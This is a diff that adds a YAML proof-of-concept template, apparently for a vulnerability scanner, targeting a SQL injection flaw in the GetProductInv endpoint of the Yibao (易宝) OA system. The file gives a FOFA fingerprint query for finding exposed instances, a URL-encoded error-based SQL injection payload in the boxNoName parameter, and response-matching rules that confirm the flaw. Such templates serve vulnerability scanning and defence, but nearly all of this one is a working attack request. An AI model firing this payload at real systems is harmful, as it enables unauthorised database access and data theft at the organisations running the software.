@@ -1,0 +1,24 @@
+id: poc-yaml-yi-bao-oa-system-getproductinv-sqli
+info:
+  name: 易宝OA系统 GetProductInv SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 易宝OA
+  fofa: body="欢迎登录易宝OA系统"
+requests:
+- method: GET
+  path: /SmartTradeScan/Inventory/GetProductInv?boxNoName=1%27%20AND%201411%20IN%20(SELECT%20(CHAR(113)%2bCHAR(98)%2bCHAR(112)%2bCHAR(112)%2bCHAR(113)%2b(SELECT%20(CASE%20WHEN%20(1411=1411)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2bCHAR(113)%2bCHAR(120)%2bCHAR(122)%2bCHAR(122)%2bCHAR(113)))--%20YyAm&positionName=2&productID=3&opeID=4
+  expression: 'status_code == 200 &&
+
+    contains(body,"在将 varchar 值 ") &&
+
+    contains(body,"转换成数据类型 int 时失败") &&
+
+    contains(body,"\"is_succeed\":false") &&
+
+    contains(content_type,"application/json")
+
+    '
+variables: {}
+transport: http
